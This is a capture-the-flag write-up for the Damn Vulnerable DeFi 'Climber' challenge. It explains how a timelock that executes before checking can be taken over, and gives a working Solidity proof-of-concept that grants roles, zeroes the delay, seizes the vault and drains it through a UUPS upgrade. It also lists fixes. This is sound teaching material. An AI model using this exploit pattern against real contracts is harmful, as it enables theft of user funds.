# Climber - A Timelock That Executes First and Checks Afterwards

**Challenge:** Damn Vulnerable DeFi v4 - Climber
**Category:** Access Control / Check-Effects Ordering / Governance Takeover
**Severity:** Critical (full takeover of the vault and every token in it)

## What's going on

A vault holds 10,000,000 DVT behind a UUPS proxy. The vault's owner is a timelock, and
that timelock is controlled by an admin and a proposer. Operations have to be scheduled
by the proposer and wait one hour before anyone can execute them. The vault's own
`withdraw` is capped at 1 token per 15 days, so it is no way to take the funds. The
player has 0.1 ETH and no roles. The goal is to move all 10,000,000 DVT to a recovery
account.

## The bug

`ClimberTimelock.execute` runs the calls first and only afterwards checks that the
operation was scheduled and ready:

```solidity
for (uint8 i = 0; i < targets.length; ++i) {
    targets[i].functionCallWithValue(dataElements[i], values[i]);
}

if (getOperationState(id) != OperationState.ReadyForExecution) {
    revert NotReadyForExecution(id);
}
```

A timelock must check first and execute second. Here anyone can call `execute` with a
batch that was never scheduled, as long as the batch makes itself look scheduled before
the loop ends.

The constructor makes that possible by granting the timelock **`ADMIN_ROLE` over itself**:

```solidity
_grantRole(ADMIN_ROLE, address(this)); // self administration
```

Calls made from inside `execute` come from the timelock, so they carry its admin rights.
A batch can therefore change the timelock's own configuration and roles while it runs.

## The attack

One call to `execute` with four actions:

1. `updateDelay(0)`, which requires `msg.sender == address(timelock)` and so is allowed
   from inside the batch. A scheduled operation is now ready immediately.
2. `grantRole(PROPOSER_ROLE, attacker)`, since the timelock is an admin and
   `ADMIN_ROLE` administers the proposer role.
3. `vault.transferOwnership(attacker)`, since the timelock owns the vault.
4. A callback into the attacker, which calls `timelock.schedule` with **the same batch**.
   The attacker is now a proposer and the delay is 0, so the operation is registered and
   already ready.

When the loop ends, the post-execution check passes and the operation is recorded as
executed, although it was never scheduled beforehand.

Then the attacker owns the vault. `withdraw` is capped, so it upgrades the vault instead:
`upgradeToAndCall` to a small implementation with an unrestricted `drain(token, to)`,
executed in the vault's own context in the same call. That sends the whole balance to
the recovery account. The replacement implementation inherits `UUPSUpgradeable`, which
`upgradeToAndCall` requires of its target.

## PoC

```solidity
function test_climber() public checkSolvedByPlayer {
    ClimberAttacker attacker = new ClimberAttacker(timelock, vault, token, recovery);
    attacker.attack();
}

contract ClimberAttacker {
    function attack() external {
        address[] memory _targets = new address[](4);
        uint256[] memory _values = new uint256[](4);
        bytes[] memory _data = new bytes[](4);

        _targets[0] = address(timelock);
        _data[0] = abi.encodeCall(timelock.updateDelay, (0));

        _targets[1] = address(timelock);
        _data[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));

        _targets[2] = address(vault);
        _data[2] = abi.encodeCall(vault.transferOwnership, (address(this)));

        _targets[3] = address(this);
        _data[3] = abi.encodeCall(this.scheduleSelf, ());

        targets = _targets; values = _values; data = _data;
        timelock.execute(_targets, _values, _data, SALT);

        address drainer = address(new ClimberDrainer());
        vault.upgradeToAndCall(drainer, abi.encodeCall(ClimberDrainer.drain, (address(token), recovery)));
    }

    function scheduleSelf() external {
        timelock.schedule(targets, values, data, SALT);
    }
}
```

Full test file: `test/climber/Climber.t.sol`

## Why I'm calling this Critical

- **Complete takeover.** The attacker gains the proposer role, controls the delay, and
  becomes owner of the vault.
- **Total loss of funds.** All 10,000,000 DVT leave through an upgrade the attacker
  controls, bypassing the withdrawal cap and waiting period entirely.
- **No privileges needed.** `execute` is callable by anyone, and the timelock's own admin
  rights do the rest.
- **The timelock's purpose is defeated.** The one-hour delay was supposed to give
  stakeholders time to react to any change, and here it is set to zero within the
  same transaction.

## Fix

- **Check, then execute.** Verify that the operation is scheduled and ready before running
  any call, and mark it executed before the external calls, following
  checks-effects-interactions.
- **Do not let the timelock administer itself through its own execution path.** Changes
  to roles and to the delay should require their own scheduled operation with its own
  delay, which is how OpenZeppelin's `TimelockController` handles it.
- Limit who can reach the vault's UUPS upgrade path, and avoid a single role holder being
  able to upgrade and drain in one step.

## Takeaway

Look at the order of checks and effects in any function that makes arbitrary external
calls. Then ask what privileges the contract holds over itself: a contract that calls
into untrusted code can have its own privileges used against its own state. A timelock
whose execution path can rewrite its own rules protects nothing.
